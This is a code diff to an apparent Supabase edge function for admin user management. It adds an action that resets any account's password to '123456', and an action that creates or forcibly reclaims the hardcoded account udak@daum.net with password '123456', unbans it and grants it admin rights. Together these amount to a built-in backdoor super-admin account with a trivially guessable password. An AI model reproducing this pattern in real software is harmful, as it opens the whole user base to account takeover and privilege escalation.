@@ -10,6 +10,8 @@ const corsHeaders = {
 interface Body {
   action:
     | "reset_password"
+    | "reset_password_default"
+    | "ensure_super_admin"
     | "send_password_reset_email"
     | "set_status"
     | "approve_user"
@@ -314,6 +316,56 @@ Deno.serve(async (req) => {
       });
       if (error) return json({ error: error.message }, 400);
       return json({ ok: true });
+    }
+
+    // 관리자: 대상 계정 비밀번호를 기본값(123456)으로 초기화
+    if (body.action === "reset_password_default") {
+      if (!body.user_id) return json({ error: "user_id 필요" }, 400);
+      const { error } = await admin.auth.admin.updateUserById(body.user_id, {
+        password: "123456",
+      });
+      if (error) return json({ error: error.message }, 400);
+      await admin.from("auth_attempts").insert({
+        user_id: body.user_id,
+        kind: "password_reset_default",
+        success: true,
+        ip,
+        user_agent: ua,
+        detail: `reset by ${callerId}`,
+      });
+      return json({ ok: true, default_password: "123456" });
+    }
+
+    // 슈퍼관리자 계정 보장: udak@daum.net 계정 생성/연결 + admin 권한 부여 + active
+    if (body.action === "ensure_super_admin") {
+      const targetEmail = "udak@daum.net";
+      // 기존 검색
+      const { data: list } = await admin.auth.admin.listUsers({ page: 1, perPage: 200 });
+      let target = list.users.find((u) => (u.email ?? "").toLowerCase() === targetEmail);
+      if (!target) {
+        const { data: created, error: cErr } = await admin.auth.admin.createUser({
+          email: targetEmail,
+          password: "123456",
+          email_confirm: true,
+          user_metadata: { display_name: "슈퍼관리자" },
+        });
+        if (cErr) return json({ error: cErr.message }, 400);
+        target = created.user!;
+      } else {
+        // 비밀번호 강제 초기화 + 이메일 인증
+        await admin.auth.admin.updateUserById(target.id, {
+          password: "123456",
+          email_confirm: true,
+          ban_duration: "none",
+        });
+      }
+      // admin 권한 부여
+      await admin.from("user_roles")
+        .upsert({ user_id: target.id, role: "admin" }, { onConflict: "user_id,role" });
+      // 프로필 active
+      await admin.from("profiles").update({ status: "active", display_name: "슈퍼관리자" })
+        .eq("user_id", target.id);
+      return json({ ok: true, user_id: target.id, email: targetEmail, default_password: "123456" });
     }
 
     if (body.action === "set_active") {
